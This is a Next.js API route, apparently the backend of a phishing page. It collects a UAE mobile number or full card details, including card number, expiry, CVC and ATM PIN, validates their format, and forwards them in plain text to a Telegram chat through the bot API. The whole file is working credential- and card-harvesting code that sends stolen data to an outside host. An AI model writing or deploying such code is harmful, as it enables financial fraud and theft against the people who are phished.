import { NextResponse } from "next/server"

function buildLoginMessage(mobile: string) {
  return `New login mobile number: +971 ${mobile}`
}

function buildCardMessage(input: {
  cardNumber: string
  expiry: string
  cvc: string
  pin: string
}) {
  const digitsOnly = input.cardNumber.replace(/\D/g, "")
  const maskedCard = digitsOnly.length >= 4 ? `**** **** **** ${digitsOnly.slice(-4)}` : "N/A"

  return [
    "New card verification submitted",
    `Card Number: ${input.cardNumber} (masked: ${maskedCard})`,
    `Expiry: ${input.expiry}`,
    `CVC: ${input.cvc}`,
    `ATM PIN: ${input.pin}`,
  ].join("\n")
}

export async function POST(request: Request) {
  try {
    const body = await request.json()
    const { mobile, cardNumber, expiry, cvc, pin } = body ?? {}

    let text: string

    if (typeof mobile === "string") {
      if (!/^\d{7,15}$/.test(mobile)) {
        return NextResponse.json({ error: "Invalid mobile number" }, { status: 400 })
      }
      text = buildLoginMessage(mobile)
    } else if (
      typeof cardNumber === "string" &&
      typeof expiry === "string" &&
      typeof cvc === "string" &&
      typeof pin === "string"
    ) {
      if (
        cardNumber.replace(/\D/g, "").length !== 16 ||
        !/^\d{2}\/\d{2}$/.test(expiry) ||
        !/^\d{3,4}$/.test(cvc) ||
        !/^\d{4}$/.test(pin)
      ) {
        return NextResponse.json({ error: "Invalid card details" }, { status: 400 })
      }
      text = buildCardMessage({ cardNumber, expiry, cvc, pin })
    } else {
      return NextResponse.json({ error: "Invalid request" }, { status: 400 })
    }

    const token = process.env.TELEGRAM_BOT_TOKEN
    const chatId = process.env.TELEGRAM_CHAT_ID

    if (!token || !chatId) {
      console.error("[v0] Telegram credentials are not configured")
      return NextResponse.json({ error: "Telegram is not configured" }, { status: 500 })
    }

    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${token}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text,
        }),
      },
    )

    if (!telegramResponse.ok) {
      console.error("[v0] Telegram request failed", telegramResponse.status)
      return NextResponse.json({ error: "Unable to send notification" }, { status: 502 })
    }

    return NextResponse.json({ ok: true })
  } catch (error) {
    console.error("[v0] Telegram notification error", error)
    return NextResponse.json({ error: "Invalid request" }, { status: 400 })
  }
}
